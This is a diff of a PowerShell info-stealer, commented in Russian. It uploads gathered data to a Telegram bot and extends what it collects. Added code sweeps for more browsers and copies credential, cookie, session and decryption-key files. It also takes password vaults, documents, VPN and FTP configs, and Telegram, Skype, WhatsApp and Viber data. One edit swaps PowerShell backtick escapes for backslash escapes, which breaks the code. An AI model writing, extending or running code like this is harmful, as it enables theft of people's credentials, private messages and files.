@@ -35,7 +35,6 @@ $OutputMessages = @{
     Complete     = "Процесс завершен."
 }
 
-
 function Send-TelegramFile {
     param([string]$FilePath, [string]$Caption = "")
     $Url = "https://api.telegram.org/bot$BotToken/sendDocument"
@@ -60,7 +59,7 @@ function Send-TelegramFile {
     }
 
     $bodyLines += "--$boundary$LF"
-    $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF"
+    $bodyLines += "Content-Disposition: form-data; name=\"document\"; filename=\"$fileName\"$LF"
     $bodyLines += "Content-Type: application/octet-stream$LF$LF"
 
     $preBody = [Text.Encoding]::UTF8.GetBytes(($bodyLines -join ''))
@@ -72,10 +71,8 @@ function Send-TelegramFile {
     [Array]::Copy($postBody, 0, $fullBody, $preBody.Length + $FileBytes.Length, $postBody.Length)
 
     $Headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
-
     Invoke-WebRequest -Uri $Url -Method Post -Body $fullBody -Headers $Headers
 }
-
 
 function Create-SplitArchive {
     param (
@@ -85,7 +82,6 @@ function Create-SplitArchive {
     )
 
     Add-Type -AssemblyName System.IO.Compression.FileSystem
-
     [System.IO.Compression.ZipFile]::CreateFromDirectory($SourcePath, $OutputZip, [System.IO.Compression.CompressionLevel]::Fastest, $false)
 
     $size = (Get-Item $OutputZip).Length
@@ -282,6 +278,13 @@ function Find-AllBrowserProfiles {
             }
         }
     }
+    # Расширенный поиск (глубокий скан)
+    $extraBrowsers = Get-ChildItem "$env:LOCALAPPDATA" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "browser|chrome|opera|edge|yandex|firefox|comet|tor|waterfox|uc|brave|vivaldi|orbitum|amigo|thorium|sun" }
+    foreach ($dir in $extraBrowsers) {
+        if (-not ($profiles.Values | % { $_ } | Where-Object { $_ -eq $dir.FullName })) {
+            $profiles[$dir.Name] = @($dir.FullName)
+        }
+    }
     return $profiles
 }
 
@@ -297,26 +300,26 @@ function Get-BrowserFiles {
         'Local State',       # Chromium decryption key
         'key4.db', 'key3.db', # Firefox decryption keys
         'logins.json',       # Firefox passwords
-        'cookies.sqlite'     # Firefox cookies
+        'cookies.sqlite',    # Firefox cookies
+        'formhistory.sqlite',# Firefox autofill
+        'places.sqlite',     # Firefox history
+        'favicons.sqlite',   # Firefox favicons
+        'Sessions', 'Session Storage', # Алтернативные сессии
+        'Secure Preferences', # Настройки Chrome
+        'Extension Cookies', # Расширенные куки
+        'Top Sites'          # Chrome топ-сайты
     )
 
     foreach ($browserName in $BrowserProfiles.Keys) {
         $browserLogPath = Join-Path -Path $LogPath -ChildPath $browserName
         New-Item -Path $browserLogPath -ItemType Directory -Force | Out-Null
         foreach ($profilePath in $BrowserProfiles[$browserName]) {
-            Get-ChildItem -Path $profilePath -Directory -Filter "*User Data*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
+            # Глубокий рекурсивный поиск файлов
+            Get-ChildItem -Path $profilePath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                 foreach($file in $filesToGrab) {
-                    $filePath = Join-Path $_.FullName $file
-                    if(Test-Path $filePath) {
-                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
-                    }
-                }
-            }
-            Get-ChildItem -Path $profilePath -Directory -Filter "*.default*" -Recurse -Depth 3 -ErrorAction SilentlyContinue | ForEach-Object {
-                foreach($file in $filesToGrab) {
-                    $filePath = Join-Path $_.FullName $file
-                    if(Test-Path $filePath) {
-                        Copy-Item -Path $filePath -Destination $browserLogPath -Force -ErrorAction SilentlyContinue
+                    if ($_.Name -eq $file) {
+                        $target = Join-Path $browserLogPath $_.Name
+                        Copy-Item -Path $_.FullName -Destination $target -Force -ErrorAction SilentlyContinue
                     }
                 }
             }
@@ -329,7 +332,7 @@ function Copy-UserFiles {
     param($LogPath)
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
     $locations = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
-    $extensions = @("*.doc*", "*.xls*", "*.txt", "*.pdf", "*.rtf", "*.kdbx")
+    $extensions = @("*.doc*", "*.xls*", "*.txt", "*.pdf", "*.rtf", "*.kdbx", "*.db", "*.ini", "*.vpn", "*.ovpn", "*.ftp", "*.conf")
     foreach ($loc in $locations) {
         Get-ChildItem -Path $loc -Include $extensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
             $targetDir = Join-Path -Path $LogPath -ChildPath ($_.Directory.Name)
@@ -364,11 +367,21 @@ function Get-GamingData {
 function Get-MessengerData {
     param($LogPath)
     New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
-    # Telegram
+    # Telegram Desktop
     try {
         $tgPath = "$env:APPDATA\Telegram Desktop\tdata"
         if (Test-Path $tgPath) {
             Copy-Item -Path $tgPath -Destination (Join-Path $LogPath "Telegram") -Recurse -Force -Exclude "user_data*", "cache*" -ErrorAction SilentlyContinue
+        }
+    } catch {}
+    # Telegram (портативный)
+    try {
+        $portablePaths = Get-ChildItem "$env:USERPROFILE" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "telegram|tg" }
+        foreach ($tg in $portablePaths) {
+            $data = Join-Path $tg.FullName "tdata"
+            if (Test-Path $data) {
+                Copy-Item -Path $data -Destination (Join-Path $LogPath "TelegramPortable") -Recurse -Force -ErrorAction SilentlyContinue
+            }
         }
     } catch {}
     # Discord
@@ -379,6 +392,27 @@ function Get-MessengerData {
             Copy-Item -Path $storagePath -Destination (Join-Path $LogPath "Discord\$($path | Split-Path -Leaf)") -Recurse -Force
         }
     }
+    # Skype
+    try {
+        $skypePath = "$env:APPDATA\Skype"
+        if (Test-Path $skypePath) {
+            Copy-Item -Path $skypePath -Destination (Join-Path $LogPath "Skype") -Recurse -Force
+        }
+    } catch {}
+    # WhatsApp Desktop
+    try {
+        $waPath = "$env:APPDATA\WhatsApp"
+        if (Test-Path $waPath) {
+            Copy-Item -Path $waPath -Destination (Join-Path $LogPath "WhatsApp") -Recurse -Force
+        }
+    } catch {}
+    # Viber
+    try {
+        $viberPath = "$env:APPDATA\ViberPC"
+        if (Test-Path $viberPath) {
+            Copy-Item -Path $viberPath -Destination (Join-Path $LogPath "Viber") -Recurse -Force
+        }
+    } catch {}
 }
 
 function Get-Tokens {
@@ -431,6 +465,36 @@ function Get-VpnFtpData {
         $openVpnPath = "$env:USERPROFILE\OpenVPN\config"
         if (Test-Path $openVpnPath) {
             Copy-Item -Path $openVpnPath -Destination (Join-Path $LogPath "OpenVPN") -Recurse -Force
+        }
+    } catch {}
+    # ExpressVPN
+    try {
+        $exprPath = "$env:APPDATA\ExpressVPN"
+        if (Test-Path $exprPath) {
+            Copy-Item -Path $exprPath -Destination (Join-Path $LogPath "ExpressVPN") -Recurse -Force
+        }
+    } catch {}
+    # NordVPN
+    try {
+        $nordPath = "$env:APPDATA\NordVPN"
+        if (Test-Path $nordPath) {
+            Copy-Item -Path $nordPath -Destination (Join-Path $LogPath "NordVPN") -Recurse -Force
+        }
+    } catch {}
+    # Cisco AnyConnect
+    try {
+        $ciscoPath = "$env:ProgramFiles\Cisco\Cisco AnyConnect Secure Mobility Client"
+        if(Test-Path $ciscoPath) {
+            Copy-Item -Path $ciscoPath -Destination (Join-Path $LogPath "CiscoAnyConnect") -Recurse -Force
+        }
+    } catch {}
+    # PPTP/L2TP (ищет .pbk и .vpn и тп)
+    try {
+        $vpnFiles = Get-ChildItem "$env:USERPROFILE" -Recurse -Include *.pbk,*.vpn,*.ovpn,*.conf,*.ini -ErrorAction SilentlyContinue
+        foreach($f in $vpnFiles) {
+            $targetdir = Join-Path $LogPath "PPTP_L2TP"
+            if (-not (Test-Path $targetdir)) { New-Item -Path $targetdir -ItemType Directory -Force | Out-Null }
+            Copy-Item $f.FullName -Destination $targetdir -Force
         }
     } catch {}
 }
